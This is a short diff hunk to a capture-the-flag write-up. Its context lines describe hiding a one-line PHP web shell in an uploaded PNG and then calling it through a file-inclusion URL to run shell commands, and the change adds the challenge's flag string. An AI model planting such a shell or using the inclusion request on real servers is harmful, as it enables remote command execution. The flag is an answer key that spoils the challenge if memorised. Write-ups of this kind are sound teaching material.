@@ -42,6 +42,8 @@ The image contains the payload `<?=$_GET[0]($_POST[1])?>`, and I am sending a `G
 
 With `/?page=uploads/yourupload.png?0=shell_exec` with POST arg `1=ls`, you can see that the exploit properly works, and you only have to find the flag (located in `/var/www/.flag`, or `../.flag`).
 
+**Flag:** `GH22{c0mpression_does_not_prot3ct_from_png_execut1on}`
+
 ## Problems
 
 ### The non-existing XSS bot
